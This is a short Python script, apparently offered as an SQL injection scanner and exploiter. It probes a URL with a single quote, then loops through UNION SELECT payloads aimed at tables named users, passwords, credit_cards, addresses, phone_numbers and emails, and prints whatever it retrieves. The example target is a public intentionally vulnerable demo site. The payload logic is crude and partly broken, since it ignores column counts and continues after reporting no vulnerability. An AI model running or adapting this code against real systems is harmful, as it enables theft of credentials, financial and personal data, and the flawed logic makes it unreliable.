import requests
import re
def sql_injection_scanner(url):
    # Check if the website is vulnerable to SQL injection
    response = requests.get(url + "'")
    if re.search("error in your SQL syntax", response.text):
        print("The website is vulnerable to SQL injection.")
    else:
        print("The website is not vulnerable to SQL injection.")
    # Exploit the SQL injection vulnerability
    sqli_payloads = [
        "' UNION SELECT * FROM users",
        "' UNION SELECT * FROM passwords",
        "' UNION SELECT * FROM credit_cards",
        "' UNION SELECT * FROM addresses",
        "' UNION SELECT * FROM phone_numbers",
        "' UNION SELECT * FROM emails",
    ]
    for payload in sqli_payloads:
        response = requests.get(url + payload)
        if re.search("username", response.text):
            print("The SQL injection vulnerability has been exploited.")
            print("The following data has been leaked:")
            print(response.text)
        else:
            print("The SQL injection vulnerability has not been exploited.")
# Example usage
sql_injection_scanner("https://demo.testfire.net/index.jsp")